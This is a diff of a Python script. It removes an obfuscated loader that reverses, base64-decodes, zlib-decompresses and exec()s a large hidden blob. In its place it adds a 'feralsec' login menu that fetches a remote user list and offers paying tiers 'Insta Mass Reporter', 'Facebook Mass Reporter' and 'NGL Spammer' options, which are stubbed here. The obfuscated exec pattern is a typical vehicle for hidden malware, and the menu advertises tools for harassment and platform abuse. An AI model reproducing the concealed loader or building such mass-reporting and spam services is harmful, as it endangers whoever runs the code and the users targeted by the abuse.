@@ -1,2 +1,132 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import os
+import json
+import time
+import requests
+from datetime import datetime
+
+def load_users():
+    url = "https://www.ransxm.world/users.json"
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        # Using .strip() and .encode().decode() to clean invisible web characters
+        clean_content = response.text.strip().encode('ascii', 'ignore').decode('ascii')
+        return json.loads(clean_content)
+    except Exception as e:
+        print(f"Error loading remote users: {e}")
+        return {}
+
+def get_gradient_rgb(factor):
+    r = int(0 + factor * 255)
+    g = int(0 + factor * 140)
+    b = int(139 + factor * -139)
+    return r, g, b
+
+def get_colored_string(text):
+    reset = "\033[0m"
+    white_text = "\033[38;5;255;1m"
+    colored_text = ""
+    length = len(text)
+    for i, char in enumerate(text):
+        factor = i / length if length > 0 else 0
+        r, g, b = get_gradient_rgb(factor)
+        bg_code = f"\033[48;2;{r};{g};{b}m"
+        colored_text += f"{bg_code}{white_text}{char}"
+    return colored_text + reset
+
+def print_blue_orange_diagonal(text):
+    lines = text.splitlines()
+    if not lines: return
+    max_width = max(len(line) for line in lines)
+    max_height = len(lines)
+    reset = "\033[0m"
+    white_text = "\033[38;5;255;1m" 
+    for y, line in enumerate(lines):
+        padded_line = line.ljust(max_width)
+        colored_line = ""
+        for x, char in enumerate(padded_line):
+            factor = (x + y) / (max_width + max_height)
+            factor = min(1.0, max(0.0, factor)) 
+            r, g, b = get_gradient_rgb(factor)
+            bg_code = f"\033[48;2;{r};{g};{b}m"
+            colored_line += f"{bg_code}{white_text}{char}"
+        print(colored_line + reset)
+
+def logging_in_default(user_data):
+    user_label = get_colored_string(" login@feralsec.net ")
+    print(f"\n\x1b[34m┌──\x1b[0m[{user_label}\x1b[0m]-[~]")
+    user_inputted = input("\x1b[34m└─\x1b[0m%> \x1b[41m").strip()
+    
+    print("\x1b[0m", end="")
+    pass_label = get_colored_string(f" {user_inputted}@password ")
+    print(f"\x1b[34m┌──\x1b[0m[{pass_label}\x1b[0m]-[~]")
+    password_inputted = input("\x1b[34m└─\x1b[0m%> \x1b[41m").strip()
+    
+    print("\x1b[0m")
+    if user_inputted in user_data and user_data[user_inputted]["password"] == password_inputted:
+        print("\x1b[32mAccess Granted!\x1b[0m")
+        time.sleep(1)
+        return user_inputted
+    else:
+        print("\x1b[31mInvalid Username or Password.\x1b[0m")
+        input("Press Enter to try again...")
+        return None
+
+def check_duration(user_name, user_info):
+    current_time = time.time()
+    expiry_time = user_info.get("expires_at", 0)
+    if current_time > expiry_time:
+        print(f"\n\x1b[31m[!] Access Expired for {user_name}.\x1b[0m")
+        return False
+    remaining = expiry_time - current_time
+    days = int(remaining // 86400)
+    print(f"\x1b[32m[+] Access valid. Remaining: {days} days.\x1b[0m")
+    return True
+
+def show_methods(tier):
+    os.system('cls' if os.name == 'nt' else 'clear')
+    now = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")
+    print_blue_orange_diagonal(menu_ascii)
+    width = 40
+    print(f"\x1b[34m┌{'─' * (width + 2)}┐\x1b[0m")
+    print(f"\x1b[34m│\x1b[0m \x1b[1mTIME:\x1b[0m {now:<{width - 6}} \x1b[34m│\x1b[0m")
+    print(f"\x1b[34m│\x1b[0m \x1b[1mPLAN:\x1b[0m {tier:<{width - 6}} \x1b[34m│\x1b[0m")
+    print(f"\x1b[34m└{'─' * (width + 2)}┘\x1b[0m")
+
+    if tier in ["EXCLUSIVE", "VIP", "scrxwy<3"]:
+        print("\n\x1b[33m[1]\x1b[0m \x1b[34mInsta Mass Reporter\x1b[0m")
+        print("\x1b[33m[2]\x1b[0m \x1b[34mFacebook Mass Reporter\x1b[0m")
+        print("\x1b[33m[3]\x1b[0m \x1b[34mNGL Spammer\x1b[0m")
+        print("\x1b[33m[0]\x1b[0m \x1b[31mLogout\x1b[0m")
+    else:
+        print("\n\x1b[37m[1] Standard-Ping\n[2] Standard-Scan\n[0] Logout\x1b[0m")
+
+def handle_session(user_name, user_info):
+    while True:
+        if not check_duration(user_name, user_info): break
+        show_methods(user_info["tier"])
+        prompt = f"\n[ \x1b[31m{user_name}\x1b[0m@feralsec ] : "
+        choice = input(prompt)
+        if choice == "0": break
+        else:
+            print(f"\nStarting Option {choice}...")
+            time.sleep(1)
+
+main_ascii = r"""    ____                __                            __ 
+   / __/__  _________ _/ /_______  _____  ____  ___  / /_
+  / /_/ _ \/ ___/ __ `/ / ___/ _ \/ ___/ / __ \/ _ \/ __/
+ / __/  __/ /  / /_/ / (__  )  __/ /___ / / / /  __/ /_  
+/_/  \___/_/   \__,_/_/____/\___/\___(_)_/ /_/\___/\__/ 
+
+--------------------------------------------------------
+[ @scrxwy | https://ransxm.world/rvnsxmservices ] """
+
+menu_ascii = main_ascii
+
+if __name__ == "__main__":
+    users = load_users()
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print_blue_orange_diagonal(main_ascii)
+    logged_user = logging_in_default(users)
+    if logged_user:
+        handle_session(logged_user, users[logged_user])
